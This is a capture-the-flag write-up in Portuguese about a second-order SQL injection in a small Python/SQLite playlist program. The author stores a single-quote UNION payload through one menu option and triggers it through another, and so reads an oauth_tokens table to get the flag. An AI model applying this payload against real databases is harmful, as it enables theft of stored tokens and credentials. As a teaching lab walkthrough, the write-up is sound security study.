# Bolos e tokens

**Flag:** `Ganesh{Th3_c@K3_i5_4_L!3}`

Neste chall somos presenteados com um mini programa feito em python2 e SQLite3 que permite ao usuário 4 ações simples, sendo elas:

1. Cadastrar uma nova música na tabela media
2. Buscar músicas de um dado artista.
3. Buscar músicas por um título de busca.
4. Tocar as músicas de um artista escolhido de forma aleatória no banco.

A primeira coisa a se fazer em um cenário que já temos o script em mãos é analisar calmamente as possíveis vulnerabilidades em cada uma delas. Então por partes...

```text
if choice == '1':
    my_print("Enter the artist name:")
    artist = raw_input().replace('"', "")

    my_print("Enter the song name:")
    song = raw_input().replace('"', "")

    c.execute("""INSERT INTO media VALUES ("{}", "{}")""".format(artist, song))
```

A opção 1 permite que nós cadastremos uma nova linha da tabela de músicas. Vemos também que há um replace que impede a inserção de aspas duplas na query. Ela, portanto, não seria vulnerável à injeções do tipo `" OR 1=1 ... --`.

```text
elif choice == '2':
    my_print("Enter the  artist name:")
    artist = raw_input().replace("'", "")

    print_playlist("""SELECT artist, song FROM media WHERE artist = '{}'""".format(artist))
```

A opção 2, assim como a 1, apresenta uma Query de busca que possui um tratamento. Esse cenário no entanto faz o tratamento de aspas simples ao invés das duplas.

```text
elif choice == '3':
    my_print("Enter the song name:")
    song = raw_input().replace("'", "")

    print_playlist("""SELECT artist, song FROM media WHERE song = '{}'""".format(song))
```

Similar à opção 2, novamente uma query de buscar porém tratando apenas as entradas com aspas simples.

```text
elif choice == '4':
    artist = random.choice(list(c.execute("SELECT DISTINCT artist FROM media")))[0]
    my_print("Choosing songs from '{}'".format(artist))

    print_playlist("""SELECT artist, song FROM media WHERE artist = '{}'""".format(artist))
```

Por fim, a quarta string busca um nome de artista de maneira aleatória do banco e, sem nenhuma etapa de tratamento, utiliza o dado recebido para construir outra query de busca pelas músicas.

A primeira vista, a impressão que podemos ter é a de que todas as querys estão seguras, uma vez que o criador do script preocupou-se de garantir que não seria possível inserir um fechamento de aspas em todas as opções que ocorrem inputs.

Uma das falhas dele, no entanto, foi não padronizar as aspas utilizadas nas diferentes querys do programa, permitindo ao usuário cadastrar strings com aspas simples na primeira opçao.

Vamos então cadastrar um artista e uma música com o seguinte payload:

```text
$ Enter the artist name:
$ ' UNION SELECT oauth_token, 'abc' FROM $ oauth_tokens --
$ Enter the song name:
$ nao importa
```

Pronto! Já temos agora nosso injection cadastrado no banco. Vamos analisar então as outras 3 opções restantes.

A opção 2 não nos permite fazer nada, pois não conseguiriamos buscar nosso último cadastro no banco devido ao replace da aspas simples.

A opção 3 permite buscar o dado pelo nome da música. Esse resultado, no entanto, é utilizado apenas para ser exibido na tela e também não nos ajuda.

Já a opção 4, como já foi citado, escolhe um artista no banco e o utiliza para fazer uma segunda query, e é ele que será o responsável por executar nosso payload.

Caso não tenha ficado 100% claro, basta ver que a variável artistas será carregada com o único artista do banco

```text
artist = random.choice(list(c.execute("SELECT DISTINCT artist FROM media")))[0]
artist = "' UNION SELECT oauth_token, 'abc' FROM oauth_tokens -- "
```

e ao concatenar esse valor na query seguinte, teremos um select com um **Union Atack**

```text
SELECT artist, song 
    FROM media 
    WHERE artist = '' 
    UNION SELECT oauth_token, 'abc' 
    FROM oauth_tokens -- '
```

Com isso somos então presentados com a nossa flag

```text
== New Playlist ==
1) Song: "abc" - Artist: "Ganesh{Th3_c@K3_i5_4_L!3}"
```

